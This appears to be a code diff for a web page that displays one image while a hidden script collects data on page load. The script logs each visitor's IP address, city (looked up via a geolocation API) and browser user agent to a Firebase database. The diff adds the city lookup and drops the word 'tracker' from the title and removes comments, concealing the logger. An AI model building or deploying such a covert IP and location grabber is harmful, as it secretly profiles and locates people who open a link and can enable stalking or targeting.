@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>s33yuh tracker</title>
+<title>s33yuh</title>
 <style>
   body, html {
     margin: 0; padding: 0; height: 100%; background: black; display: flex; justify-content: center; align-items: center;
@@ -17,7 +17,6 @@
   <img src="https://i.postimg.cc/sDT2SQhG/B9-E00-A9-C-FC2-A-4-E03-8-BBE-82-FFB81-AA2-D7.jpg" alt="Tracker Image" />
 
   <script type="module">
-    // Firebase SDK import from CDN
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
     import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
 
@@ -31,11 +30,9 @@
       appId: "1:1004328351276:web:549a980def23a4112c8389"
     };
 
-    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    // Function to get user IP (free API)
     async function getIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -46,14 +43,28 @@
       }
     }
 
+    async function getCity(ip) {
+      try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        return data.city || 'unknown';
+      } catch {
+        return 'unknown';
+      }
+    }
+
     async function logVisit() {
       const ip = await getIP();
+      const city = await getCity(ip);
       const userAgent = navigator.userAgent || 'unknown';
       const visitRef = ref(db, 'visits');
       push(visitRef, {
         ip,
+        city,
         userAgent,
         timestamp: serverTimestamp()
+      }).then(() => {
+        console.log('Visit logged with city:', city);
       }).catch(e => {
         console.error('Failed to log visit:', e);
       });
